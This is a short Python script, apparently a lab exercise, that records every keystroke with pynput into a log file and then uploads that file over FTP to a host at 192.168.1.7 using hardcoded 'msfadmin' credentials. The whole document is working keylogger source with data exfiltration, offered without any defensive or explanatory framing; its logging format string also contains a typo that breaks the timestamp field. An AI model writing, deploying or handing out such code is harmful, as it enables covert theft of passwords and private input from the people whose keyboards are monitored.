from pynput import keyboard
from pynput.keyboard import Listener
import logging
import ftplib

logdir = ""

logging.basicConfig(filename=(logdir+"klog-res.txt"),level=logging.DEBUG,format="%(acstime)s:%(message)s")

def on_press(key):
    try:
        logging.info(str(key))
    except:
        print("Special Character {0}: ".format(key))

def on_release(key):
    if key == keyboard.Key.esc:
        #stop listener
        return False

print("\nStart Listener ...")

with Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()

print("\nConnecting to the FTP and sending the data ...")

session = ftplib.FTP("192.168.1.7", "msfadmin", "msfadmin")
file = open("klog-res.txt", "rb")
session.storbinary("STOR klog-res.txt", file)
file.close()
session.quit()